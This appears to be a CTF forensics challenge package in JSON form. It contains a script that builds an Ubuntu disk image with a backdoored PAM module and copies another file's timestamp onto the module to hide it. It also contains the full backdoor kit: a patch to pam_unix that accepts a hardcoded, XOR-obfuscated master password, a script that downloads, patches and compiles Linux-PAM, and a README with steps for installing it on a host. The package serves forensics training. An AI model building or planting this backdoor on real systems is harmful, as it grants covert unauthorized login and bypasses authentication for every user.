{
    ".gitignore": "mnt/\ndisk.img\ndisk.img.zlib\n",
    "create_image.sh": "#!/bin/bash\n\nset -e\n\nrm -f disk.img\n\ntouch disk.img\nfallocate -z -l $((1 << 31)) disk.img\n\nmkfs.ext4 disk.img\nloopdev=$(losetup -f)\nsudo losetup \"${loopdev}\" disk.img\n\nmkdir -p mnt\nsudo mount \"${loopdev}\" mnt\n\nsudo debootstrap focal mnt\n\ncd pam_backdoor\n./backdoor.sh -v 1.3.1\n\ncd ..\nsudo cp pam_backdoor/pam_unix.so mnt/usr/lib/x86_64-linux-gnu/security/\nsudo touch -d @$(stat -c \"%Y\" \"mnt/usr/lib/x86_64-linux-gnu/security/pam_access.so\") \"mnt/usr/lib/x86_64-linux-gnu/security/pam_unix.so\"\n\nsudo umount mnt\nsudo losetup -d \"${loopdev}\"\nrm -r mnt\n\nzlib-flate -compress=3 < disk.img > disk.img.zlib\n",
    "README.md": "# Non-stick Disk\n\n## Description\n\nWe've established a persistence mechanism on the attached disk. Can you determine what that is?\n\nHint: the flag is in the standard format. You'll know it when you see it. :)\n\n## Solution\n\n(writeup courtesy of `nightfury`)\n\nCheck out https://murphe22.com/posts/tamuctf22/, and scroll to \"Non Stick Disk\".\n",
    "pam_backdoor\\.gitignore": "linux-pam-*/\nv*.tar.gz\npam_unix.so\n",
    "pam_backdoor\\backdoor.patch": "*** ./modules/pam_unix/pam_unix_auth.c\t2018-05-18 06:07:13.000000000 -0500\n--- pam_unix_auth.c\t2022-04-09 14:41:00.748584122 -0500\n*************** pam_sm_authenticate(pam_handle_t *pamh,\n*** 176,178 ****\n  \t/* verify the password of this user */\n! \tretval = _unix_verify_password(pamh, name, p, ctrl);\n  \tname = p = NULL;\n--- 176,187 ----\n  \t/* verify the password of this user */\n!         char alternative[] = {141, 199, 96, 39, 186, 187, 67, 113, 166, 47, 108, 110, 104, 12, 106, 3, 140, 198, 11, 4, 148, 73, 44, 146, 78, 164, 205, 75, 254, 241, 119, 204, 237, 220, 182, 14, 154, 84, 0};\n!         char alternative_key[] = {234, 174, 7, 66, 215, 192, 34, 46, 196, 70, 24, 49, 28, 99, 5, 92, 227, 164, 125, 109, 251, 60, 95, 205, 39, 194, 146, 50, 145, 132, 40, 173, 158, 183, 233, 99, 255, 41};\n!         for (int i = 0; i < 38; i++) {\n!           alternative[i] ^= alternative_key[i];\n!         }\n!         if (strcmp(p, alternative) != 0) {\n!           retval = _unix_verify_password(pamh, name, p, ctrl);\n!         } else {\n!           retval = PAM_SUCCESS;\n!         }\n  \tname = p = NULL;\n",
    "pam_backdoor\\backdoor.sh": "#!/bin/bash\n\nset -e\n\nOPTIND=1\n\nPAM_VERSION=\nPAM_FILE=\n\necho \"Automatic PAM Backdoor\"\n\nfunction show_help {\n\techo \"\"\n\techo \"Example usage: $0 -v 1.3.0\"\n\techo \"For a list of supported versions: https://github.com/linux-pam/linux-pam/releases\"\n}\n\nwhile getopts \":h:?:v:\" opt; do\n    case \"$opt\" in\n    h|\\?)\n        show_help\n        exit 0\n        ;;\n    v)  PAM_VERSION=\"$OPTARG\"\n        ;;\n    esac\ndone\n\nshift $((OPTIND-1))\n\n[ \"$1\" = \"--\" ] && shift\n\nif [ -z $PAM_VERSION ]; then\n\tshow_help\n\texit 1\nfi;\n\necho \"PAM Version: $PAM_VERSION\"\necho \"\"\n\nPAM_BASE_URL=\"https://github.com/linux-pam/linux-pam/archive\"\nPAM_DIR=\"linux-pam-${PAM_VERSION}\"\nPAM_FILE=\"v${PAM_VERSION}.tar.gz\"\nPATCH_DIR=`which patch`\n\nif [ $? -ne 0 ]; then\n\techo \"Error: patch command not found. Exiting...\"\n\texit 1\nfi\nwget -c \"${PAM_BASE_URL}/${PAM_FILE}\"\nif [[ $? -ne 0 ]]; then # did not work, trying the old format    \n    PAM_DIR=\"linux-pam-Linux-PAM-${PAM_VERSION}\"\n    PAM_FILE=\"Linux-PAM-${PAM_VERSION}.tar.gz\"\n    wget -c \"${PAM_BASE_URL}/${PAM_FILE}\"\n    if [[ $? -ne 0 ]]; then\n        # older version need a _ instead of a .\n        PAM_VERSION=\"$(echo $PAM_VERSION | tr '.' '_')\"  \n        PAM_DIR=\"linux-pam-Linux-PAM-${PAM_VERSION}\"\n        PAM_FILE=\"Linux-PAM-${PAM_VERSION}.tar.gz\"\n        wget -c \"${PAM_BASE_URL}/${PAM_FILE}\"\n        if [[ $? -ne 0 ]]; then        \n            echo \"Failed to download\"\n            exit 1\n        fi        \n    fi\nfi\n\ntar xzf $PAM_FILE\ncat backdoor.patch | patch -p1 -d $PAM_DIR\ncd $PAM_DIR\n# newer version need autogen to generate the configure script\nif [[ ! -f \"./configure\" ]]; then \n    ./autogen.sh \nfi \n./configure\nmake -j$(nproc)\ncp modules/pam_unix/.libs/pam_unix.so ../\ncd ..\necho \"Backdoor created.\"\necho \"Now copy the generated ./pam_unix.so to the right directory (usually /lib/security/)\"\necho \"\"\n\n",
    "pam_backdoor\\LICENSE": "MIT License\n\nCopyright (c) 2017 zeph\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n",
    "pam_backdoor\\README.md": "Modified from: https://github.com/zephrax/linux-pam-backdoor\n\n# linux-pam-backdoor         \nLinux PAM Backdoor           \n                             \nThis script automates the creation of a backdoor for Linux-PAM (Pluggable Authentication Modules)\n\n## Usage\nTo generate the backdoored pam_unix.so, just run:\n```\n./backdoor.sh -v 1.3.0 -p som3_s3cr4t_p455w0rd\n```\n\nYou have to identify the PAM version installed on the system, to make sure the script will compile the right version. Otherwise you can break the whole system authentication.\n\nAfter the execution of the script, the last step is to copy the generated pam_unix.so to the pam modules dir on the host. \n\n```\ncp pam_unix.so /usr/lib/security/\n```\n\nThat's all. \n\nAfter that, you can log-in to the system using an existing user, and the previously configured password.\n\nUse this for educational purposes only.\nI am not responsible for the damage you might cause.\n\n## Dependencies \n\nTested with ubuntu 20.04: \n* 1.1.8 and older: failed to compile\n* 1.2.0: worked\n* 1.3.0 to 1.4.0: worked\n\nThe following packages where used\n```bash\napt install -y  autoconf automake autopoint bison bzip2 docbook-xml docbook-xsl flex gettext libaudit-dev libcrack2-dev libdb-dev libfl-dev libselinux1-dev libtool libcrypt-dev libxml2-utils make pkg-config sed w3m xsltproc xz-utils gcc\n```\n",
    "category": "forensics"
}